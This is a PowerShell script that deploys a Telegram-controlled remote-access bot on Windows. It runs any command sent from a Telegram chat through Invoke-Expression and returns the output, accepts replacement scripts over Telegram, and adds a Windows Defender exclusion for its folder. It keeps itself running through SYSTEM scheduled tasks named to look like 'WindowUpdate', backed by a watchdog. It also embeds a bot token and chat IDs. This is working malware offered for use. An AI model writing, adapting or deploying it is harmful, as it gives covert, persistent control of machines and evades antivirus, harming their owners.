# ============================================================
#  Deploy-TGBot.ps1 - Persistent Telegram Bot Deployer (FIXED)
#  Installs to: C:\Program Files\Catalogs\  (visible, not hidden)
#  Adds Defender exclusion for that path only
#  Ensures ONLY ONE bot instance runs at any time (mutex + watchdog)
#  Run as Administrator
# ============================================================

$installDir   = "$env:ProgramFiles\Catalogs"
$installPath  = "$installDir\sys_tg.ps1"
$watchdogPath = "$installDir\sys_tg_watchdog.ps1"
$logPath      = "$installDir\bot.log"

# ===== Ensure we're elevated =====
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ===== Create install folder (visible, normal attributes) =====
if (-not (Test-Path $installDir)) {
    New-Item -Path $installDir -ItemType Directory -Force | Out-Null
}
# Explicitly CLEAR any Hidden/System attributes in case a prior run set them
$folderItem = Get-Item $installDir -Force
$folderItem.Attributes = [System.IO.FileAttributes]::Directory
Write-Host "[+] Install dir ready (visible): $installDir" -ForegroundColor Green

# ===== Add Windows Defender exclusion for install folder ONLY =====
try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Write-Host "[+] Defender exclusion added for $installDir" -ForegroundColor Green
} catch {
    Write-Host "[!] Could not add Defender exclusion: $_" -ForegroundColor Yellow
}

# =====================================================================
# ===== BOT SCRIPT (runs from C:\Program Files\Catalogs\sys_tg.ps1) ==
# =====================================================================
$script = @'
# ===== AUTO ELEVATE =====
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ===== CONFIG =====
$BOT_TOKEN       = "8583495386:AAF3F8CCG-yCxMyGPeGGbt63UD7NbO5O6qg"
$ADMIN_CHAT_IDS  = @("347753116","7303070402","6716357143","380330092")
$PRIMARY_CHAT_ID = "380330092"
$CHAT_ID         = $PRIMARY_CHAT_ID   # <-- FIX: was undefined in original

$lastUpdate = 0
$updateMode = $false
$computerName = $env:COMPUTERNAME
$script:processedCommands = @{}

# ===== SINGLE-INSTANCE MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, "Global\TGBot_$computerName")
if (-not $mutex.WaitOne(0, $false)) {
    Write-Host "Another instance is already running. Exiting."
    exit
}

# ===== NETWORK WAIT =====
function Wait-ForNetwork {
    $attempts = 0
    while ($attempts -lt 12) {
        try {
            $null = Invoke-RestMethod -Uri "https://api.telegram.org" -TimeoutSec 5
            return $true
        } catch {
            $attempts++
            Start-Sleep -Seconds 5
        }
    }
    return $false
}

if (-not (Wait-ForNetwork)) {
    Write-Host "Network not available, exiting"
    $mutex.ReleaseMutex()
    exit
}

function Send($text, $replyToMessageId = $null) {
    $body = @{
        chat_id = $CHAT_ID
        text    = "[$computerName]`n$text"
    }
    if ($replyToMessageId) { $body.reply_to_message_id = $replyToMessageId }

    $retry = 0
    do {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Method Post -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
            return
        } catch {
            $retry++
            if ($retry -lt 3) { Start-Sleep -Seconds 2 }
        }
    } while ($retry -lt 3)
}

function GetUpdates {
    try {
        return Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdate&timeout=25" -TimeoutSec 30
    } catch { return $null }
}

function DownloadFile($file_id, $savePath) {
    try {
        $file = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getFile?file_id=$file_id"
        $url  = "https://api.telegram.org/file/bot$BOT_TOKEN/$($file.result.file_path)"
        Invoke-WebRequest $url -OutFile $savePath
        return $true
    } catch { return $false }
}

function IsCommandForMe($commandText) {
    if ($commandText -match "^@(\S+)\s+(.+)$") {
        $target = $matches[1]
        $cmd    = $matches[2]
        if ($target -eq $computerName -or $target -in @("all","broadcast","everyone")) { return $cmd }
        return $null
    }
    return $commandText
}

function IsCommandProcessed($messageId, $commandText) {
    $key = "$messageId`_$commandText"
    if ($script:processedCommands.ContainsKey($key)) { return $true }
    $script:processedCommands[$key] = $true
    if ($script:processedCommands.Count -gt 100) {
        # FIX: materialize keys BEFORE removing, otherwise hashtable enumeration throws
        $keysToRemove = @($script:processedCommands.Keys) | Select-Object -First 50
        foreach ($k in $keysToRemove) { [void]$script:processedCommands.Remove($k) }
    }
    return $false
}

function Set-PowerShellPolicy {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
        try { Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction SilentlyContinue } catch {}
        $env:POWERSHELL_TELEMETRY_OPTOUT = 1
        $env:POWERSHELL_UPDATECHECK = 'Off'
        $PSDefaultParameterValues['*:Confirm'] = $false
        $PSDefaultParameterValues['*:Force']   = $true
    } catch {}
}
Set-PowerShellPolicy

Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
Send "Bot started on $computerName"

$consecutiveErrors = 0

while ($true) {
    try {
        $updates = GetUpdates

        if ($updates -and $updates.result) {
            $consecutiveErrors = 0

            foreach ($u in $updates.result) {
                $lastUpdate = $u.update_id + 1
                if ($u.message.chat.id -ne $CHAT_ID) { continue }
                $messageId = $u.message.message_id

                # ===== COMMAND =====
                if ($u.message.text) {
                    $actualCommand = IsCommandForMe $u.message.text
                    if ($null -eq $actualCommand) { continue }
                    if (IsCommandProcessed $messageId $actualCommand) { continue }

                    if ($actualCommand -eq "/update") {
                        $updateMode = $true
                        Send "Update mode activated. Send new .ps1 file." $messageId
                        continue
                    }
                    if ($actualCommand -eq "/status") {
                        $uptime = (Get-Date) - (Get-Process -Id $PID).StartTime
                        $os = (Get-CimInstance Win32_OperatingSystem).Caption
                        $status = "Status Report`nComputer: $computerName`nOS: $os`nUptime: $($uptime.ToString('hh\h mm\m ss\s'))`nProcesses: $((Get-Process).Count)`nMemory: $([math]::Round((Get-Process -Id $PID).WorkingSet64/1MB,2)) MB"
                        Send $status $messageId
                        continue
                    }
                    if ($actualCommand -eq "/test") { Send "Test OK - $computerName alive`n$(Get-Date -Format 'HH:mm:ss')" $messageId; continue }
                    if ($actualCommand -eq "/ping") { Send "Pong from $computerName" $messageId; continue }
                    if ($actualCommand -eq "/who")  { Send "Current user: $(whoami 2>&1 | Out-String)" $messageId; continue }

                    Send "Executing command..." $messageId
                    try {
                        $out = & { $ErrorActionPreference = 'Continue'; Invoke-Expression $actualCommand 2>&1 } | Out-String -Width 4096
                        if ([string]::IsNullOrWhiteSpace($out)) { $out = "Command executed successfully (no output)" }
                    } catch { $out = "Error: $($_.Exception.Message)" }

                    $maxLength = 3800
                    if ($out.Length -gt $maxLength) { $out = $out.Substring(0,$maxLength) + "`n... (truncated)" }
                    Send $out $messageId
                }

                # ===== UPDATE =====
                if ($updateMode -and $u.message.document) {
                    $fileName = $u.message.document.file_name
                    if ($fileName -like "*.ps1") {
                        $newPath = "$env:TEMP\update_$([Guid]::NewGuid()).ps1"
                        if (DownloadFile $u.message.document.file_id $newPath) {
                            Send "Updating $computerName..." $messageId
                            Copy-Item $PSCommandPath "$PSCommandPath.backup" -Force -ErrorAction SilentlyContinue
                            Copy-Item $newPath $PSCommandPath -Force
                            Remove-Item $newPath -Force -ErrorAction SilentlyContinue
                            Send "$computerName updated. Restarting..." $messageId
                            Start-Sleep 2
                            $mutex.ReleaseMutex()
                            Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
                            exit
                        } else { Send "Failed to download file" $messageId }
                    } else { Send "Please send a .ps1 file" $messageId }
                    $updateMode = $false
                }
            }
        }
    } catch {
        $consecutiveErrors++
        Write-Host "Error in main loop: $_"
        # FIX: was `Start-Sleep (if (...) {...} else {...})` -> parse error in original
        $sleepTime = if ($consecutiveErrors -gt 5) { 30 } else { 10 }
        Start-Sleep -Seconds $sleepTime
    }

    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
}

$mutex.ReleaseMutex()
'@

# Save bot script (visible, normal attributes)
Set-Content -Path $installPath -Value $script -Force
Write-Host "[+] Bot script written: $installPath" -ForegroundColor Green

# =====================================================================
# ===== KILL ALL EXISTING BOT INSTANCES (clean slate) ================
# =====================================================================
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*sys_tg.ps1*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

Start-Sleep -Seconds 2

# =====================================================================
# ===== WATCHDOG SCRIPT ==============================================
# =====================================================================
$watchdogScript = @"
# Watchdog: ensures the bot is running (exactly one instance)
`$botFile = "$installPath"

# Count running bot instances
`$instances = @(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { `$_.CommandLine -like "*sys_tg.ps1*" })

if (`$instances.Count -eq 0) {
    Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`$botFile`"" -WindowStyle Hidden
}
elseif (`$instances.Count -gt 1) {
    `$sorted = `$instances | Sort-Object CreationDate -Descending
    `$sorted | Select-Object -Skip 1 | ForEach-Object {
        Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue
    }
}
"@

Set-Content -Path $watchdogPath -Value $watchdogScript -Force
Write-Host "[+] Watchdog script written: $watchdogPath" -ForegroundColor Green

# =====================================================================
# ===== SCHEDULED TASKS ==============================================
# =====================================================================
$taskPath = "\WindowUpdate\"

# --- Action for bot task ---
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""

# --- Action for watchdog task ---
$watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`""

# --- Settings: infinite run, restart on failure, ignore duplicate launches ---
# NOTE: omitted -ExecutionTimeLimit because (New-TimeSpan -Days 0) is undefined behavior.
# Default for -ExecutionTimeLimit when not specified is "no limit" for tasks registered this way.
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -RestartCount 999 `
    -MultipleInstances IgnoreNew `
    -DontStopOnIdleEnd `
    -Priority 4

# --- Watchdog settings: short-lived check every 2 min ---
$watchdogSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 2) `
    -MultipleInstances IgnoreNew

# --- Triggers ---
$triggerStartup = New-ScheduledTaskTrigger -AtStartup
$triggerStartup.Delay = "PT30S"

$triggerLogon = New-ScheduledTaskTrigger -AtLogOn

$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
    -RepetitionInterval (New-TimeSpan -Minutes 15) `
    -RepetitionDuration (New-TimeSpan -Days 3650)

# --- Principal: SYSTEM, highest ---
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# --- Register main task (single task, 3 triggers) ---
Register-ScheduledTask `
    -TaskName "WindowUpdate1" `
    -TaskPath $taskPath `
    -Action $action `
    -Trigger @($triggerStartup,$triggerLogon,$triggerRepeat) `
    -Settings $settings `
    -Principal $principal `
    -Description "Runs Telegram bot. Single instance enforced by mutex." `
    -Force | Out-Null

# --- Watchdog trigger: every 2 min, forever ---
$watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 2) `
    -RepetitionDuration (New-TimeSpan -Days 3650)

# --- Register watchdog task ---
Register-ScheduledTask `
    -TaskName "WindowUpdate_Watchdog" `
    -TaskPath $taskPath `
    -Action $watchdogAction `
    -Trigger $watchdogTrigger `
    -Settings $watchdogSettings `
    -Principal $principal `
    -Description "Watchdog: starts bot if not running; kills duplicates." `
    -Force | Out-Null

# =====================================================================
# ===== START NOW =====================================================
# =====================================================================
Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -WindowStyle Hidden

Start-ScheduledTask -TaskName "WindowUpdate1" -TaskPath $taskPath -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskName "WindowUpdate_Watchdog" -TaskPath $taskPath -ErrorAction SilentlyContinue

# =====================================================================
# ===== SUMMARY =======================================================
# =====================================================================
Write-Host "==========================================" -ForegroundColor Green
Write-Host " Bot deployed on $env:COMPUTERNAME" -ForegroundColor Green
Write-Host " Install dir : $installDir (VISIBLE)" -ForegroundColor Green
Write-Host " Bot script  : $installPath" -ForegroundColor Green
Write-Host " Watchdog    : $watchdogPath" -ForegroundColor Green
Write-Host " Defender    : $installDir excluded" -ForegroundColor Green
Write-Host " Tasks       : \WindowUpdate\WindowUpdate1" -ForegroundColor Green
Write-Host "               \WindowUpdate\WindowUpdate_Watchdog" -ForegroundColor Green
Write-Host " Instances   : enforced single via Global Mutex" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green